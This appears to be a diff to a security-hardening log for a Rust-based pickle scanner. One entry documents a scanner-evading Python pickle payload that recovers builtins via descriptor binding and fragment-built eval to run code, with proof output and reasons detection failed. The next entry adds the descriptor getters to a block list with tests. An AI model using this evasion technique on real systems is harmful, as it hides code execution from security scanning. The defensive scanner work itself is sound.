@@ -8369,3 +8369,108 @@ Blocking plan:
 Performance note: this is another sorted-table policy lookup over a parsed
 global operand. It adds no imports, no source reads, no resolver execution, and
 no call-graph expansion.
+
+## Turn 151 - Bypass via static descriptor recovery and member descriptor bind
+
+Found a scanner-clean RCE that bypasses module namespace blocking by recovering
+the builtin namespace through Python's descriptor machinery instead of through
+an imported module dictionary. The payload uses `inspect.getattr_static` to
+obtain the `function.__builtins__` member descriptor from a clean function
+object, then calls `types.MemberDescriptorType.__get__` to bind that descriptor
+to the same function and read the actual builtins dictionary.
+
+The payload builds the descriptor name and eval key at unpickle time:
+
+```python
+attr_name = "".join(["_", "_", "builtins", "_", "_"])
+descriptor = inspect.getattr_static(statistics.mean, attr_name)
+builtins_dict = types.MemberDescriptorType.__get__(descriptor, statistics.mean)
+fn = dict.get(builtins_dict, "".join(["ev", "al"]))
+code = "".join(
+    [
+        "open('/tmp/.../marker','w').write('owned-by-descriptor-static')",
+    ]
+)
+fn(code)
+```
+
+The active pickle imports only:
+
+- `inspect.getattr_static`
+- `statistics.mean`
+- `builtins.str.join`
+- `types.MemberDescriptorType.__get__`
+- `statistics.mean`
+- `builtins.dict.get`
+- `builtins.str.join`
+- `builtins.str.join`
+
+Proof on CPython 3.12.12:
+
+- Control payload scanner result: `len=159`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`.
+- Control import references: one clean `builtins.str.join`.
+- Control runtime: `pickle.loads(control)` returns the assembled eval code
+  string and creates no marker.
+- Active payload scanner result: `len=389`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`.
+- Active import references: `inspect.getattr_static`, two `statistics.mean`
+  references, `types.MemberDescriptorType.__get__`,
+  `builtins.dict.get`, and three `builtins.str.join` references, all with
+  `is_dangerous=False`.
+- Active runtime before unpickle: marker absent.
+- Active runtime after unpickle: marker exists and contains
+  `owned-by-descriptor-static`; `pickle.loads(active)` returns the integer byte
+  count from `open(...).write(...)`.
+
+Why the scanner missed it:
+
+- The direct namespace-global block catches `module.__dict__` and
+  `module.__builtins__`, but this payload never imports a module namespace. It
+  starts from a normal clean function global, `statistics.mean`.
+- Suspicious-string matching does not see contiguous `__builtins__`, `eval`, or
+  `open(...)` tokens because the descriptor name, eval key, and code string are
+  all assembled from fragments with `str.join`.
+- `inspect.getattr_static` is not in the dangerous-global table, and the
+  Python call-graph pass does not model it as a dynamic descriptor recovery
+  primitive.
+- `types.MemberDescriptorType.__get__` is not treated like other blocked
+  descriptor getters, even though binding the `function.__builtins__` member
+  descriptor exposes the builtin namespace.
+- The stack model does not track that the descriptor returned by
+  `inspect.getattr_static` and then passed into `MemberDescriptorType.__get__`
+  resolves to a namespace dictionary whose recovered `eval` is later invoked.
+
+Performance note: the next block should stay close to descriptor source
+primitives. The narrow fix is to treat descriptor getter globals such as
+`types.MemberDescriptorType.__get__` and likely
+`types.GetSetDescriptorType.__get__` as critical, matching the existing
+descriptor-source policy for `property.__get__`, `classmethod.__get__`,
+`staticmethod`, and `types.DynamicClassAttribute.__get__`. This remains a
+constant sorted-table policy lookup with no imports, descriptor binding, or
+call-graph expansion.
+
+## Turn 152 - Block low-level descriptor getters
+
+Blocking plan:
+
+- Add `types.MemberDescriptorType.__get__` and
+  `types.GetSetDescriptorType.__get__` to the finite dangerous-global policy
+  table. These are low-level descriptor binding primitives; when supplied a
+  recovered function descriptor they can expose `__builtins__`, `__globals__`,
+  `__code__`, or mutable function state without importing those namespace names
+  as globals.
+- Add Rust unit coverage for both descriptor getter globals beside the existing
+  `types.DynamicClassAttribute.__get__` check.
+- Add a CPython oracle regression for the Turn 151 payload. The control payload
+  only assembles the eval code string and remains clean; the active payload
+  recovers the `function.__builtins__` member descriptor with
+  `inspect.getattr_static`, binds it with
+  `types.MemberDescriptorType.__get__`, is flagged as malicious, and still
+  writes the marker if loaded.
+- Add direct global-reference regressions for both descriptor getter types.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: this stays in the Rust policy table and remains a constant
+sorted lookup over parsed pickle globals. It adds no imports, no descriptor
+binding, no source reads, and no call-graph traversal.
